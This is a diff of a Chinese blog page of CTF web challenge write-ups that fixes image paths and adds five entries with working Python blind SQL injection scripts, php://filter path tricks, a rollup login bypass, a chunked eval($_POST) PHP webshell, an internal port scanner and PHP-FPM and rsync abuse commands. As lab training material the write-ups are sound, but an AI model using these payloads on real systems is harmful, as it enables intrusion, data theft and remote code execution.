@@ -109,7 +109,7 @@
 <meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/23.png">
 <meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/24.png">
 <meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/21.png">
-<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/E:/blog/myblog/source/_posts/积累的一些web题目/20.png">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/20.png">
 <meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/15.png">
 <meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/16.png">
 <meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/17.png">
@@ -140,7 +140,25 @@
 <meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/42.jpg">
 <meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/43.jpg">
 <meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/44.jpg">
-<meta property="og:updated_time" content="2020-11-11T01:09:32.486Z">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/45.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/46.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/47.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/48.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/49.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/51.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/50.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/52.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/53.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/54.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/55.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/56.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/57.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/58.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/59.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/60.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/61.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/12/30/积累的一些web题目/62.jpg">
+<meta property="og:updated_time" content="2020-12-20T09:45:12.025Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="积累的一些web题目">
 <meta name="twitter:description" content="[GXYCTF2019]BabySQli 考点：SQL注入  题目界面  随便输入用户名和密码后查看源码得到提示 1MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 解开为 1select * from user where username = &apos;$na">
@@ -377,7 +395,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  4.4k
+                  5.7k
                 </span>
               
 
@@ -393,7 +411,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  23
+                  29
                 </span>
               
             </div>
@@ -481,7 +499,7 @@
 <p>考点：SQL盲注</p>
 </blockquote>
 <p>题目界面</p>
-<p><img src="/2019/12/30/积累的一些web题目/E:/blog\myblog\source\_posts\积累的一些web题目\20.png" alt="20"></p>
+<p><img src="/2019/12/30/积累的一些web题目/20.png" alt="20"></p>
 <p>题目注入点在<code>search.php?id=1</code>当<code>id=1=0</code>和<code>id=1=1</code>时会有不同结果返回，脚本如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://5d1768ad-6d8d-462b-96c1-5c28f6edb4fc.node3.buuoj.cn/search.php?id=1="</span></span><br><span class="line">s = requests.session()</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">dict_sql = <span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&amp;*/()_-+=&#123;&#125;.:,'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">2000</span>):</span><br><span class="line">    print(<span class="string">'===================================='</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict_sql:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        payload = <span class="string">"((ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1)))=&#123;&#125;)"</span>.format(i,ord(j))</span><br><span class="line">        url1 = url+payload</span><br><span class="line">        html = s.get(url1,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Click others~~~'</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            result = result+j</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p>数据</p>
@@ -613,6 +631,83 @@
 <p><img src="/2019/12/30/积累的一些web题目/43.jpg" alt="43"></p>
 <p>会执行curl命令，拿到flag</p>
 <p><img src="/2019/12/30/积累的一些web题目/44.jpg" alt="44"></p>
+<h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2><blockquote>
+<p>考点:sqlite注入绕过</p>
+</blockquote>
+<p>题目界面</p>
+<p><img src="/2019/12/30/积累的一些web题目/45.jpg" alt="45"></p>
+<p>源码</p>
+<p><img src="/2019/12/30/积累的一些web题目/46.jpg" alt="46"></p>
+<p>此处id是注入点，但是过滤了常规的注入函数。这里可使用replace进行长度的替换来进行盲注</p>
+<p>用下面的测试来说明问题</p>
+<p><img src="/2019/12/30/积累的一些web题目/47.jpg" alt="47"></p>
+<p>这样通过逐位爆破就可以拿到flag</p>
+<p>在本题中过滤了单引号，空格等特殊字符串，可以使用括号分割的方式来代替空格，然后使用双hex将flag转换为只有0-9的数字，但是replace替换只能替换完整的数字，我们可以使用||来将数字转换为字符串，测试如图</p>
+<p><img src="/2019/12/30/积累的一些web题目/48.jpg" alt="48"></p>
+<p>脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://50f65f15-fd2f-4898-8a74-9f812aff59f4.node3.buuoj.cn/vote.php"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    print(<span class="string">"========================================================"</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment">#爆破flag长度</span></span><br><span class="line">        <span class="comment"># payload = f"abs(case(replace(length(hex(hex((select(flag)from(flag))))),&#123;i&#125;,trim(0,0)))when(trim(0,0))then(0x100)else(0x8000000000000000)end)"</span></span><br><span class="line">        temp = result+<span class="string">"||"</span>+str(j)</span><br><span class="line">        len1 = <span class="number">109</span>-i</span><br><span class="line">        payload = <span class="string">f"abs(case(length(replace(hex(hex((select(flag)from(flag)))),3||6||3||6||3||6||4||3||3||6||3||1||3||6||3||7||3||7||4||2||3||3||3||7||3||6||3||5||3||6||3||4||3||3||3||7||3||3||3||2||3||3||3||9||3||6||3||5||3||3||3||9||3||2||4||4||3||3||3<span class="subst">&#123;temp&#125;</span>,trim(0,0))))when(<span class="subst">&#123;len1&#125;</span>)then(0x100)else(0x8000000000000000)end)"</span></span><br><span class="line">        data = &#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">        print(len1,payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html = s.post(url,data=data)</span><br><span class="line">            <span class="comment"># print(html.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Thank you"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                result = temp</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><blockquote>
+<p>考点：sql注入，session触发</p>
+</blockquote>
+<p>题目界面</p>
+<p><img src="/2019/12/30/积累的一些web题目/49.jpg" alt="49"></p>
+<p>查看源码，<code>index.php</code></p>
+<p><img src="/2019/12/30/积累的一些web题目/51.jpg" alt="51"></p>
+<p>过滤了传入进来的数据，接着看<code>login.php</code></p>
+<p><img src="/2019/12/30/积累的一些web题目/50.jpg" alt="50"></p>
+<p>对于传入的参数没有任何过滤，但是存在着<code>session</code>校验，直接访问是会<code>die</code>的</p>
+<p>查到如下资料</p>
+<p><img src="/2019/12/30/积累的一些web题目/52.jpg" alt="52"></p>
+<p>那么我们可以这样来绕过<code>session</code>校验</p>
+<p><img src="/2019/12/30/积累的一些web题目/53.jpg" alt="53"></p>
+<p>然后就是正常的<code>sql</code>注入，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">dicts = <span class="string">"1234567890qwertyuiopasdfghjklzxcvbnm_,.-=&#123;&#125;QWERTYUIOPASDFGHJKLZXCVBNM:?#@!$%^&amp;*()"</span></span><br><span class="line">results = <span class="string">""</span></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://c911afa2-0281-44d1-8053-97a57aaeb3e6.node3.buuoj.cn/templates/login.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    print(<span class="string">"==================================="</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        ass = ord(j)</span><br><span class="line">        <span class="comment"># payload = f"""?username=ad"%20or%20if((ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),&#123;i&#125;,1))=&#123;ass&#125;),0,1)%23&amp;password=1234567890"""</span></span><br><span class="line">        <span class="comment"># payload = f"""?username=ad"%20or%20if((ascii(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='flag_tbl'),&#123;i&#125;,1))=&#123;ass&#125;),0,1)%23&amp;password=1234567890"""</span></span><br><span class="line">        payload = <span class="string">f"""?username=ad"%20or%20if((ascii(substr((select%20secret%20from%20flag_tbl),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;ass&#125;</span>),0,1)%23&amp;password=1234567890"""</span></span><br><span class="line">        cookies = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"b682f0720ec20073b57edf45e2041840"</span>&#125;</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        html = s.post(url=url+payload,cookies=cookies,files=&#123;<span class="string">"file"</span>:<span class="string">"666"</span>&#125;,data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="number">122</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Try"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            results = results+j</span><br><span class="line">            print(results)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><blockquote>
+<p>考点：require_once小缺陷</p>
+</blockquote>
+<p>题目如图</p>
+<p><img src="/2019/12/30/积累的一些web题目/54.jpg" alt="54"></p>
+<p><code>require_once</code>执行过后，继续使用该函数包含同一个文件不会再次包含，这里可以使用require软链接的小缺陷</p>
+<p>尝试如下方式读取<code>flag.php</code> </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/var/</span>www<span class="regexp">/html/</span>flag.php</span><br></pre></td></tr></table></figure>
+<p>还可以使用如下方法</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/hello/</span>..<span class="regexp">/proc/</span>self<span class="regexp">/cwd/</span>flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="Black-Watch-入群题-Web2"><a href="#Black-Watch-入群题-Web2" class="headerlink" title="[Black Watch 入群题]Web2"></a>[Black Watch 入群题]Web2</h2><blockquote>
+<p>考点：rollup注入，mysql任意文件读取</p>
+</blockquote>
+<p>题目界面</p>
+<p><img src="/2019/12/30/积累的一些web题目/55.jpg" alt="55"></p>
+<p>登陆处过滤了<code>or &#39;  and</code> 等，可使用<code>group by with rollup</code>，可将<code>username</code>的单引号转义掉，<code>payload</code>如下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=\&amp;password=||1<span class="built_in"> group </span>by token with rollup having token is NULL--+&amp;<span class="attribute">question</span>=1</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/12/30/积累的一些web题目/56.jpg" alt="56"></p>
+<p>成功登陆后台，在查看数据处可使用<code>00</code>截断来进行目录穿越列目录</p>
+<p><img src="/2019/12/30/积累的一些web题目/57.jpg" alt="57"></p>
+<p>可以拿到<code>flag</code>文件名，接着利用题目中的数据备份功能，配合mysql客户端任意文件读取漏洞读取<code>flag</code>，参考如下文章</p>
+<p><a href="https://blog.csdn.net/qq_41107295/article/details/100743094" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/100743094</a></p>
+<p>工具下载地址</p>
+<p><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<p><img src="/2019/12/30/积累的一些web题目/58.jpg" alt="58"></p>
+<h2 id="2018-web-virink-web"><a href="#2018-web-virink-web" class="headerlink" title="2018_web_virink_web"></a>2018_web_virink_web</h2><blockquote>
+<p>考点：限制字符数量写shell，PHP-FPM未授权访问漏洞，rsync未授权访问漏洞</p>
+</blockquote>
+<p>题目界面</p>
+<p><img src="/2019/12/30/积累的一些web题目/59.jpg" alt="59"></p>
+<p>限制了 命令执行的长度长度，可分块写入<code>shell</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;?php'</span>&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'eva'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'l($'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'_PO'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'ST['</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'c])'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">';'</span>&gt;&gt;<span class="number">1.</span>php</span><br></pre></td></tr></table></figure>
+<p>写入后发现存在内网服务，使用如下脚本探测端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'active_port.txt'</span>,<span class="string">'at'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65535</span>+<span class="number">1</span>):</span><br><span class="line">            ip = <span class="string">'10.21.125.10'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure>
+<p>存在<code>9000</code>和<code>873</code>端口</p>
+<p>9000端口存在PHP-FPM未授权访问漏洞，参考如下文章</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+<p>脚本如下</p>
+<p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fpm<span class="selector-class">.py</span> <span class="number">10.21</span>.<span class="number">125.10</span> /www/redirect<span class="selector-class">.php</span> -c <span class="string">"&lt;?php system(\'ls /\');?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/12/30/积累的一些web题目/60.jpg" alt="60"></p>
+<p>可以拿到flag文件名但是无权限读取，在这里可利用<code>rsync</code>未授权访问漏洞将<code>flag</code>拷贝到<code>/tmp/</code>目录下</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>::src/<span class="number">7</span>h1s_i5_f14g /tmp/</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/12/30/积累的一些web题目/61.jpg" alt="61"></p>
+<p>读取<code>flag</code></p>
+<p><img src="/2019/12/30/积累的一些web题目/62.jpg" alt="62"></p>
 
       
     </div>
@@ -761,7 +856,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-count">71</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -886,7 +981,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-BabySQli"><span class="nav-number">1.</span> <span class="nav-text">[GXYCTF2019]BabySQli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#virink-2019-files-share"><span class="nav-number">2.</span> <span class="nav-text">virink_2019_files_share</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSAWQual-2019-Web-Unagi"><span class="nav-number">3.</span> <span class="nav-text">[CSAWQual 2019]Web_Unagi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GoogleCTF2019-Quals-Bnv"><span class="nav-number">4.</span> <span class="nav-text">[GoogleCTF2019 Quals]Bnv</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-Easy-Notes"><span class="nav-number">5.</span> <span class="nav-text">[HarekazeCTF2019]Easy Notes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number">6.</span> <span class="nav-text">[RCTF2015]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-FinalSQL"><span class="nav-number">7.</span> <span class="nav-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安洵杯-2019-不是文件上传"><span class="nav-number">8.</span> <span class="nav-text">[安洵杯 2019]不是文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk"><span class="nav-number">9.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">10.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-枯燥的抽奖"><span class="nav-number">11.</span> <span class="nav-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-encode-and-encode"><span class="nav-number">12.</span> <span class="nav-text">[HarekazeCTF2019]encode_and_encode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day1-Web2-ikun"><span class="nav-number">13.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MRCTF2020-Ezaudit"><span class="nav-number">14.</span> <span class="nav-text">[MRCTF2020]Ezaudit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BSidesCF-2019-Mixer"><span class="nav-number">15.</span> <span class="nav-text">[BSidesCF 2019]Mixer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网鼎杯-2020-青龙组-notes"><span class="nav-number">16.</span> <span class="nav-text">[网鼎杯 2020 青龙组]notes</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-BabySQli"><span class="nav-number">1.</span> <span class="nav-text">[GXYCTF2019]BabySQli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#virink-2019-files-share"><span class="nav-number">2.</span> <span class="nav-text">virink_2019_files_share</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSAWQual-2019-Web-Unagi"><span class="nav-number">3.</span> <span class="nav-text">[CSAWQual 2019]Web_Unagi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GoogleCTF2019-Quals-Bnv"><span class="nav-number">4.</span> <span class="nav-text">[GoogleCTF2019 Quals]Bnv</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-Easy-Notes"><span class="nav-number">5.</span> <span class="nav-text">[HarekazeCTF2019]Easy Notes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number">6.</span> <span class="nav-text">[RCTF2015]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-FinalSQL"><span class="nav-number">7.</span> <span class="nav-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安洵杯-2019-不是文件上传"><span class="nav-number">8.</span> <span class="nav-text">[安洵杯 2019]不是文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk"><span class="nav-number">9.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">10.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-枯燥的抽奖"><span class="nav-number">11.</span> <span class="nav-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-encode-and-encode"><span class="nav-number">12.</span> <span class="nav-text">[HarekazeCTF2019]encode_and_encode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day1-Web2-ikun"><span class="nav-number">13.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MRCTF2020-Ezaudit"><span class="nav-number">14.</span> <span class="nav-text">[MRCTF2020]Ezaudit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BSidesCF-2019-Mixer"><span class="nav-number">15.</span> <span class="nav-text">[BSidesCF 2019]Mixer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网鼎杯-2020-青龙组-notes"><span class="nav-number">16.</span> <span class="nav-text">[网鼎杯 2020 青龙组]notes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-Sqlite-Voting"><span class="nav-number">17.</span> <span class="nav-text">[HarekazeCTF2019]Sqlite Voting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PwnThyBytes-2019-Baby-SQL"><span class="nav-number">18.</span> <span class="nav-text">[PwnThyBytes 2019]Baby_SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMCTF2020-Make-PHP-Great-Again"><span class="nav-number">19.</span> <span class="nav-text">[WMCTF2020]Make PHP Great Again</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Black-Watch-入群题-Web2"><span class="nav-number">20.</span> <span class="nav-text">[Black Watch 入群题]Web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018-web-virink-web"><span class="nav-number">21.</span> <span class="nav-text">2018_web_virink_web</span></a></li></ol></div>
             
 
           </div>
@@ -906,7 +1001,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
